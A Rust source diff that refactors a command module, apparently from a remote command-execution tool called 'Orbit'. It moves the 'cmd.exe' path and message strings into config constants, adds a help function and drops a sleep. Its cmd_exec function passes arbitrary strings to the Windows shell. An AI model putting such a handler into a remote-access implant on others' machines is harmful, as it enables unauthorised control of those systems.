@@ -1,14 +1,13 @@
+use crate::config;
 use crate::utils;
 
 use std::io;
 use std::process;
-use std::thread;
-use std::time;
 
 // execute a cmd command
 pub fn cmd_exec(cmd: &String) -> Result<String, io::Error> {
     // run cmd command
-    let command = process::Command::new("cmd.exe")
+    let command = process::Command::new(config::commands::CLI)
         .args(["/C", cmd])
         .output()?;
 
@@ -20,7 +19,7 @@ pub fn cmd_exec(cmd: &String) -> Result<String, io::Error> {
     };
 
     // convert output to a string
-    let output = String::from_utf8(output).unwrap_or(String::from("Cannot Read Command's Output"));
+    let output = String::from_utf8(output).unwrap_or(String::from(config::commands::OUTPUT_ERR));
     Ok(output)
 }
 
@@ -40,13 +39,15 @@ pub fn exit() -> ! {
     process::exit(0x0100);
 }
 
+pub fn help() -> Result<String, io::Error> {
+    Ok(String::from(config::commands::HELP))
+}
+
 // that function does nothing
 pub fn nothing() -> Result<String, io::Error> {
-    thread::sleep(time::Duration::from_secs(1));
-
     Ok(String::new())
 }
 
 pub fn unknown_command() -> Result<String, io::Error> {
-    Ok(String::from("Orbit Error: Unknown Command"))
+    Ok(String::from(config::commands::UNKNOWN_COMMAND))
 }
